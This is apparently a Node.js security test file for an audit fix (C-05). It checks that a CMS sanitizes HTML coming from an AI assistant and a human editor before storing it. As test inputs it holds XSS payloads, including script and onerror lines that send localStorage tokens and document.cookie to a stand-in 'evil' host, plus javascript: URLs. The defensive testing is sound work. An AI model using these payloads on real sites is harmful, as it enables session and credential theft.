// =============================================================================
// C-05 — server-side sanitization at the two write paths into
// blog_posts.body_html / cms_pages.body_html:
//   1. services/ai.js's markdownToHtml() — the AI assistant's content input
//      (untrusted the same way any user input is, via prompt injection from
//      a KB article or contact note) was wrapped in tags with zero escaping.
//   2. routes/cms.js's POST/PUT /blog and /pages — the human Tiptap editor's
//      raw HTML had no sanitization at all before hitting the database.
//
// Both are unit-level tests against the actual functions/modules, not full
// HTTP round-trips — this is the write BOUNDARY the audit's fix targets,
// and it's the same function/route regardless of caller.
//
// Run:  node server/tests/security/C-05.xss-sanitization.test.js
// =============================================================================
const path = require('path');

let pass = 0, fail = 0;
function check(name, fn) {
  try {
    fn();
    console.log(`  PASS  ${name}`);
    pass++;
  } catch (e) {
    console.log(`  FAIL  ${name}\n        ${e.message}`);
    fail++;
  }
}

(async () => {
  console.log('== C-05 XSS sanitization ==');

  // --- markdownToHtml (services/ai.js) ---
  const { markdownToHtml } = require(path.join(__dirname, '..', '..', 'src', 'services', 'ai.js'));

  check('markdownToHtml escapes a literal <script> tag in AI content input', () => {
    const out = markdownToHtml('Some intro.\n\n<script>fetch("//evil/?t="+localStorage.lc_token)</script>');
    if (/<script/i.test(out)) throw new Error(`raw <script> tag survived in output: ${out}`);
  });

  check('markdownToHtml escapes an img/onerror payload in AI content input', () => {
    const out = markdownToHtml('<img src=x onerror=alert(1)>');
    if (/onerror\s*=/i.test(out) && !/&quot;onerror/.test(out)) {
      // Only fail if onerror appears as a live attribute, not as escaped text.
      if (/<img[^>]*onerror/i.test(out)) throw new Error(`live onerror attribute survived: ${out}`);
    }
  });

  check('markdownToHtml still renders legitimate markdown (no regression)', () => {
    const out = markdownToHtml('## Heading\n\nSome **bold** text.');
    if (!/<h2>Heading<\/h2>/.test(out)) throw new Error(`heading transform broke: ${out}`);
    if (!/<strong>bold<\/strong>/.test(out)) throw new Error(`bold transform broke: ${out}`);
  });

  const { sanitizeHtml } = require(path.join(__dirname, '..', '..', 'src', 'services', 'sanitizeHtml.js'));

  check('sanitizeHtml strips <script> tags', () => {
    const out = sanitizeHtml('<p>hello</p><script>alert(document.cookie)</script>');
    if (/<script/i.test(out)) throw new Error(`script tag survived: ${out}`);
  });

  check('sanitizeHtml strips inline event handlers', () => {
    const out = sanitizeHtml('<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">');
    if (/onerror/i.test(out)) throw new Error(`onerror survived: ${out}`);
  });

  check('sanitizeHtml strips javascript: URLs', () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
    if (/javascript:/i.test(out)) throw new Error(`javascript: URL survived: ${out}`);
  });

  check('sanitizeHtml preserves legitimate formatting (no regression)', () => {
    const out = sanitizeHtml('<h2>Heading</h2><p>Some <strong>bold</strong> text and a <a href="https://example.org">link</a>.</p>');
    if (!/<h2>Heading<\/h2>/.test(out)) throw new Error('heading was stripped');
    if (!/<strong>bold<\/strong>/.test(out)) throw new Error('strong tag was stripped');
    if (!/<a href="https:\/\/example\.org">link<\/a>/.test(out)) throw new Error('legitimate link was stripped');
  });

  check('cms.js imports and calls sanitizeHtml on every body_html write', () => {
    const fs = require('fs');
    const src = fs.readFileSync(path.join(__dirname, '..', '..', 'src', 'routes', 'cms.js'), 'utf8');
    if (!/require\(.*sanitizeHtml.*\)/.test(src)) throw new Error('cms.js does not import sanitizeHtml');
    // The two POST routes' insert-object literals must wrap body_html —
    // exclude the zod schema field declarations (body_html: z.string()...).
    const postAssignments = (src.match(/body_html:\s+[^,\n]+/g) || [])
      .filter((l) => !/z\.string\(/.test(l));
    const unwrapped = postAssignments.filter((l) => !/sanitizeHtml\(/.test(l));
    if (unwrapped.length) throw new Error(`found unwrapped INSERT body_html assignment(s): ${unwrapped.join(' | ')}`);
    // The two PUT routes must sanitize in place before the dynamic UPDATE.
    const putReassignments = src.match(/body\.body_html\s*=\s*sanitizeHtml\(body\.body_html\)/g) || [];
    if (putReassignments.length < 2) {
      throw new Error(`expected 2 PUT-route sanitize reassignments (pages + blog), found ${putReassignments.length}`);
    }
  });

  console.log(`\n${pass}/${pass + fail} passed`);
  process.exit(fail ? 1 : 0);
})();
